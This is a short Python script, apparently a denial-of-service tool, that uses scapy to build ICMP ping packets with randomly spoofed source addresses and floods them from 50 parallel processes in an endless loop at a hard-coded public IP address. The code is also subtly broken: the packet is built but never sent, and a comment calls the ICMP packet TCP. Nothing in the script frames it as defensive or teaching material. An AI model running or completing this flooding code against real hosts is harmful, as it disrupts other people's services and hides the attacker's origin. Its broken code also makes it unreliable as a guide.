import logging

#from scapy.layers.inet import ICMP

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import multiprocessing

from scapy.all import *
from random import randint

#产生随机ip
def ip_random():
    ip_1=randint(1,254)
    ip_2=randint(1,254)
    ip_3=randint(1, 254)
    ip_4=randint(1, 254)
    ip_source=str(f'{ip_1}.{ip_2}.{ip_3}.{ip_4}')
    return ip_source


#随机生成IP id
ip_id=randint(1,65535)
#随机生成ping id
ping_id=randint(1,65535)
#随机生成ping id序列号
seq_ping=randint(1,65535)
#构造tcp数据包
def scapy_ping_data(host):
    tcp_packet=IP(src=ip_random(),dst=host,ttl=1,id=ip_id)/ICMP(id=ping_id,seq=seq_ping)/b'hello,world'*100

#控制发送数量
def scapy_ping_10k(host):
    for j in range(100):
        for i in range(100):
            scapy_ping_data(host)

#控制并发数量
def scapy_ping_dos(host,count):
    pool=multiprocessing.Pool(processes=count)
    while True:
        pool.apply_async(scapy_ping_10k,(host,))

if __name__ == '__main__':
    scapy_ping_dos(host='121.40.68.153',count=50)